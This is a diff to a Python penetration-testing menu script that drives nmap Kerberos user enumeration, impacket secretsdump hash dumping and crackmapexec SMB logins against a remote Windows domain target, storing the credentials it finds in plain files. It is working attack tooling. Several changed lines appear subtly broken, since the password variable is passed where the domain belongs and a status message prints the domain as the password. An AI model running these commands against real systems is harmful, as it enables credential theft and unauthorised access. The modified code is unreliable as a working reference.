@@ -44,7 +44,7 @@ if len(sys.argv) < 3:
 
 BH1 = sys.argv[1]	# NEO4J USERNAME
 BH2 = sys.argv[2]	# NEO4J PASSWORD
-BUG = 0			# DEBUG = 1
+BUG = 0			# BUGHUNT ON/OFF
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -338,10 +338,10 @@ else:
 print("[-] Populating system variables...")
 
 COL1 = 19
-COL2 = 31
-COL3 = 26
-COL4 = 32
-COL5 = 15
+COL2 = 31	
+COL3 = 26	# USER
+COL4 = 32	# PASSWORD
+COL5 = 15	# SHARE
 
 PRO  = "/usr/share/doc/python3-impacket/examples/" # IMPACKET LOCATION
 LIP  = "10.10.10.xxx       " # LOCAL IP
@@ -425,7 +425,7 @@ else:
    DNSN = padding(DNSN, COL1)
    TIP  = padding(TIP,  COL1)
    USR  = padding(USR,  COL1)
-   PAS  = padding(PAS,  COL1)
+   PAS  = padding(PAS,  COL4)
    if FRST[:5] == "EMPTY":
       FRST = padding(FRST, COL1)
    HST  = padding(HST,  COL1)
@@ -475,11 +475,14 @@ while True:
          command("echo '\"\"' >> config.txt")
       else:
          command("echo " + USR  + " >> config.txt")     
+      
       if PAS.rstrip(" ") == "\"\"":
          command("echo '\"\"' >> config.txt")
       else:
          command("echo " + PAS  + " >> config.txt")
-      command("echo " + FRST.rstrip("\n") + " >> config.txt") 
+      
+      command("echo " + FRST.rstrip("\n") + " >> config.txt") # CURRENT PASSWORD
+      
       command("echo " + HST  + " >> config.txt")  
       command("echo " + WGRP.rstrip("\n") + " >> config.txt")
       command("echo " + HIP  + " >> config.txt")  
@@ -527,11 +530,11 @@ while True:
    if selection =='2':
       BAK = TIP
       TIP = input("\nPlease enter REMOTE IP address: ")
-      if TIP != "":
+      if TIP == "":
+         TIP = BAK
+      else:
          if len(TIP) < COL1:
             TIP = padding(TIP, COL1)
-      else:
-         TIP = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1222,7 +1225,7 @@ while True:
    if selection == '41':
       print("\n[+] Please wait...")      
       print("\n[+] Checking to see if any found username is assigned to Kerberous...")
-      command("nmap -p 88 -script krb5-enum-users -script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
+      command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + HST.rstrip(" ") + ", userdb=users.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       command("sed -i '/@/!d' KUSERS.tmp")
       command("sort KUSERS.tmp > USERS2.tmp")
       os.remove("KUSERS.tmp")
@@ -1241,9 +1244,12 @@ while True:
             else:
                US[x] = "                                "	# ASSIGN EMPTY USERS
             PA[x] = "................................";		# RESET PASSWORDS
-         US[x] = padding(US[x], COL3)
-         PA[x] = padding(PA[x], COL4)
-      
+
+         if len(US[x]) < COL3:
+            US[x] = padding(US[x], COL3)
+         if len(PA[x]) < COL4:
+            PA[x] = padding(PA[x], COL4)
+
       if US[12] != "                          ":
          US[11] = "Some users are not shown!!"
       command("mv USERS2.tmp USERS.tmp")
@@ -1505,8 +1511,8 @@ while True:
    if selection =='54':
       print("\n[+] Please wait...\n")
       os.remove("SECRETS.tmp")
-      command(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
-      command("cat SECRETS.tmp")
+      command(PRO + "secretsdump.py " + PAS.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
+#     command("cat SECRETS.tmp")
       command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
       os.remove("SECRETS2.tmp")
       command("cat SECRETS.tmp | wc -l > count.txt")
@@ -1516,14 +1522,23 @@ while True:
       for x in range(0, count2):
          data = linecache.getline("SECRETS.tmp",x+1)
          data = data.replace(":::","")
-         temp = HST.rstrip(" ") + "\\"
+         temp = PAS.rstrip(" ") + "\\"	# HST
          data = data.replace(temp,"")
          get1,get2,get3,get4 = data.split(":")
-         get1 = padding(get1,COL3) 			# USER
-         get4 = padding(get4,COL4) 			# PASSWORD
+ 
+         get1 = get1.rstrip("\n")
+         get4 = get4.rstrip("\n")
+         print("Found User ", get1, "\t using hash password ",get4, "...")
+
+         if len(get1) < COL3:
+            get1 = padding(get1,COL3) 			# USER
+         if len(get4) < COL4:
+            get4 = padding(get4,COL4) 			# PASSWORD
+
          for y in range (0, MAX):
             if US[y] == get1:				# MATCH USER
                PA[y] = get4				# MATCH PASSWORD 
+
       for z in range(0, MAX):
          if US[z].rstrip(" ") == USR.rstrip(" "):	# CURRENT USER
             FRST = PA[z]				# DISPLAY HASH 
@@ -1539,7 +1554,7 @@ while True:
 
    if selection =='55':
       if (USR[:1] != "\""):# & (PAS[:1] != "\""):
-         print("\n[-]Trying user " + USR.rstrip(" ") + " with password " + PAS.rstrip(" ") + "...\n")
+         print("\n[-]Trying user " + USR.rstrip(" ") + " with password " + HST.rstrip(" ") + "...\n")
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --shares ")
          print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
          HASH = " "
